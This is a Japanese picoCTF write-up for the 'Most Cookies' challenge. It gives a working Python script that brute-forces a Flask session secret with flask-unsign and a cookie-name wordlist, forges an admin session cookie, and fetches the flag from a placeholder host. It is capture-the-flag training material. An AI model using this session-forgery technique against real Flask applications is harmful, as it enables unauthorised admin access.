---
title: 'MostCookie - picoCTF'
description: 'Most CookieのWriteupです。'
pubDate: 2025-12-26
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'Flask', 'Flask Session']
---

# MostCookies - picoCTF

## 初期調査

Flaskのセッションをデコード
```
{'very_auth': 'blank'}
```
`very_auth:admin`に改竄するんだと推測

## Flask Sessino

`from flask import session` Flaskのセッション管理に使用される

### ツール

- Flask Unsign

Flaskのセッションをデコードしたり、単語リストを元に秘密鍵を解明し、秘密鍵を元に改竄したりできるツール。\
`flask-unsign --decode --cookie 'YouAreCookie'`

## 詰まった部分

秘密鍵の単語リストを見つけることができなかった。元はホワイトボックスでリストが公開されていたらしいが、現在はブラックボックスになっており単語リストがないのでこの部分で詰む。\
もしかしたら内部コードを見れる場所が用意されているのかも、未検証

## Exploit

```py
import requests
from urllib.parse import *
import subprocess

URL = "http://challenge-host"

endpoint = "/search"
req = requests.get(urljoin(URL, endpoint))
cookie = req.cookies.get("session")

wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
with open("wordlist.txt", "w") as f:
  for w in wordlist:
    f.write(w + "\n")

cmd = [
  "flask-unsign",
  "--unsign",
  "--wordlist", "wordlist.txt",
  "--cookie", cookie,
  "--no-literal-eval",
]
result = subprocess.run(cmd, capture_output=True, text=True)
secret = result.stdout

cookie_admin="{'very_auth': 'admin'}"
cmd = [
  'flask-unsign',
  '--sign',
  '--cookie', cookie_admin,
  '--secret', secret
]
result = subprocess.run(cmd, capture_output=True, text=True)
cookie = result.stdout.strip()

endpoint = "/display"
headers = {
  "Cookie": f"session={cookie}"
}
req = requests.get(urljoin(URL, endpoint), headers=headers)

print(req.text)
```

実行:

```html
<div class="jumbotron">
    <p class="lead"></p>
    <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{***}</code></p>
</div>
```